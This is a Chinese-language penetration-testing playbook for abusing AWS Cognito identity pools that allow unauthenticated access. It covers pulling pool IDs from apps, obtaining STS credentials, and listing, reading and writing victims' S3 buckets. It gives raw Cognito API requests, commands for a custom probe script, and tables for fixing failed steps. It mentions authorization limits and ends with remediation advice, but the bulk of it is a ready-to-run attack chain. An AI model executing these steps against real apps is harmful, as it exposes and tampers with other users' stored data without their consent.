# Cognito 未认证身份池打 S3 手法

> Skill：`杀招/客池`  
> 探针：`炼蛊房/cognito_s3_probe.py`  
> 抽包：`apk-recon` · `apk_recon.py`  
> 裸桶（无 Cognito）：`bucket_probe.py`  
> 阿里云长钥：`云府·临钥.md`  
> 元数据 SSRF：`cloud-metadata-harvesting`  
> **仅授权 App/站**。Cognito/S3 域名不扩进 `targets`。

---

## 0. 一句话

客户端硬编码 **Cognito IdentityPoolId**，且身份池允许 **未认证身份**，再配上过宽的 Unauth IAM（`s3:List*` / `GetObject` / `PutObject` / `DeleteObject`），就能 **零账号** 换 STS 临时钥，列桶、读对象、写/覆盖/删。  
这不是 RCE，是 **云对象矩阵**：他人读 + 他人写 + 配置面。

---

## 1. 适用指纹

| 层 | 信号 |
|----|------|
| 客户端 | APK `lib*.so` / iOS 主二进制 / `awsconfiguration.json` / Amplify |
| 字符串 | `IdentityPoolId`、`CognitoIdentityCredentials`、`GetCredentialsForIdentity` |
| 池 ID | `{region}:{uuid}`，如 `ap-southeast-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx` |
| 角色 | `assumed-role/Cognito_*Unauth*_Role/CognitoIdentityCredentials` |
| 桶 | `*-prod` / `app-image-*` / `app-header-*`；自定义域 CNAME 到 S3 |
| 对象 | 头像/聊天图明文；语音/视频/xlog 常 TEA 或厂商加密 |

匿名 `ListBucket` 403 **不能**否定本卡：权限可能只挂在 Cognito 角色上，不在桶 ACL。

---

## 2. 证明分级

| 级别 | 含义 | 本家族 |
|------|------|--------|
| observed | 客户端有池 ID | strings 命中 |
| primitive | 未认证 `GetId` | 池开着 |
| local_proof | STS + CallerIdentity | 临时钥有效 |
| remote_proof | List 桶/对象 | 他人读成立 |
| write_proof | 自建 marker Put+Delete | 写格成立，**不是**已投毒全站 |
| integrity_hit | 覆盖真实用户 Key | **先问**；必须备份并恢复 |

```text
抽到池 ID ≠ 能换钥
换到 STS ≠ 能列用户数据
ListObjects ≠ 已拖 23 万对象
Put 自建文件 ≠ 已替换全站头像
TEA 密文能下载 ≠ 聊天内容已解密
```

## 3. 六步杀伤链

### ① 抽 IdentityPoolId

```bash
python3 炼蛊房/apk_recon.py strings --apk <app.apk> --case <案卷>
python3 炼蛊房/cognito_s3_probe.py extract --path <apk或解包> --case <案卷>
```

`extract` 会解压 `.apk/.ipa/.zip`，扫压缩的 `awsconfiguration.json` / `.so` / `.plist`。  
也搜前端 JS。命中后记下 **region**（池 ID 冒号前）。支持 `cn-north-1` / `cn-northwest-1`。

### ② 未认证 GetId

```http
POST https://cognito-identity.{region}.amazonaws.com/
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityService.GetId

{"IdentityPoolId":"<region:uuid>"}
```

成功回 `IdentityId`。`NotAuthorizedException` = 未认证关闭，本卡 L1 阴性，转认证池 / 长钥 / 裸桶。

### ③ 换 STS

```http
POST https://cognito-identity.{region}.amazonaws.com/
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity

{"IdentityId":"<IdentityId>"}
```

回 `AccessKeyId` / `SecretKey` / `SessionToken`。  
看 AssumedRole 是否带 `Unauth`。完整钥只进 `案卷/cognito_s3/creds.json`（勿提交 git）。

### ④ 身份 + 列桶

```bash
python3 炼蛊房/cognito_s3_probe.py chain \
  --app-host <授权域名> --case <案卷> --pool-id '<region:uuid>'
```

- `GetCallerIdentity` 打全球 `sts.amazonaws.com`，**签名 region 必须是 `us-east-1`**（不是池所在区）。中国区走 `sts.{region}.amazonaws.com.cn`。
- `ListAllMyBuckets` 常开 → 同账号其它桶（仍属该授权 App 云账号，不是乱扩第三方站）
- 桶可能不在池所在区：探针读 `x-amz-bucket-region` / PermanentRedirect 后换区重试；也可 `--s3-region`

### ⑤ 列对象 + 明文分类

`ListObjects` 截断即可（默认 50 个 Key，`--max-keys`）。`chain` 会按扩展名/路径打 `plaintext` / `encrypted_hint` / `unknown`。

| 类型 | 典型 | 处理 |
|------|------|------|
| 明文图 | jpg/png/gif 头像、贴纸 | L3：`get-sample --bucket <桶>` 只抽 **1** 张 |
| 密文 | TEA / xlog / voice / encrypt | 记元数据（存在/大小/时间），不假装已解密 |
| 备份 | `msg-backup` / `logsfile` | 高价值；全量下先问 |

```bash
python3 炼蛊房/cognito_s3_probe.py get-sample \
  --app-host <授权域名> --case <案卷> \
  --creds-file 案卷/<案卷>/案卷/cognito_s3/creds.json \
  --bucket <桶>
```

自定义域（`s3.example.com` → 桶）只是 CDN 入口，权限仍看 IAM。Key 含空格/中文时必须走 SigV4 规范编码（探针已做）。

### ⑥ 写格（默认 marker）

```bash
python3 炼蛊房/cognito_s3_probe.py write-probe \
  --app-host <授权域名> --case <案卷> \
  --creds-file 案卷/<案卷>/案卷/cognito_s3/creds.json \
  --bucket <桶>
```

`--creds-file` 复用 `chain` 的临时钥，避免每次重新 GetId。仍可用 `--pool-id` 现换。

只写 `.daaixianzun-writeprobe-<ts>`，读回后删除。  
**禁止默认**：覆盖用户头像、批量 DELETE、上传可执行马到安装包桶。

报告里的「覆盖头像、URL 不变、全站加载恶意图」是 **完整性/投毒演示**，授权内最多 1 个 Key 且必须先 GET 备份再恢复。

## 4. 对象矩阵（有临时钥必填）

| | 读 | 写 | 加款 | 配置 |
|--|----|----|------|------|
| 自己 | 自建 marker | Put/Delete marker | 无 | 无 |
| 他人 | List/Get 用户对象 | 覆盖他人 Key（先问） | 无 | Unauth 角色 / 桶策略 |

专卡阴性（例如只能 List 不能 Get）必须回表，不要写「S3 已打穿」。

---

## 5. 缺环表

| 已有 | 缺 | 下一刀 | 不要做 |
|------|----|--------|--------|
| 池 ID 字符串 | GetId | 换 region / 确认未认证开关 | 当长 AK 用 |
| GetId | STS | 池可能要 Login Provider | 穷举 Cognito 用户池密码 |
| STS 签错区 | GetCallerIdentity 403 | 全球端点必须 `us-east-1` | 用池所在区签 sts.amazonaws.com |
| List 301 | 桶在别的区 | 跟 `x-amz-bucket-region` 或 `--s3-region` | 把 301 当没权限 |
| STS | List | 角色可能无 s3 | 当元数据 SSRF |
| List | Get 明文 | 抽 1 个小对象 | 全量同步用户图 |
| Get 密文 | 密钥/算法 | APK 里找 TEA key | 把 zip 当已读聊天 |
| Put marker | 覆盖用户 | 先问 + 备份恢复 | 批量换头像 |
| 安装包桶 | 客户端更新链 | 对照桌面更新签名 | 当 webshell |

和海王 OSS 上传的差别：海王是 **业务上传口落到公开桶**；本卡是 **云身份池换钥后直连 S3 API**。两条都可填「他人读/写」，手法不同。

---

## 6. 修复建议（给报告）

1. `AllowUnauthenticatedIdentities = false`，或 Unauth 角色零 S3  
2. Unauth 最多 `s3:GetObject` 到**自己前缀**（`userid/`），禁止 ListAll / Delete / Put 覆盖  
3. 头像/聊天图也加密或走短时预签名 URL，客户端不直连写桶  
4. 池 ID 可出现在客户端，但权限不能靠「没人知道池 ID」  
5. 开对象版本控制 + CloudTrail；轮换已泄露会话
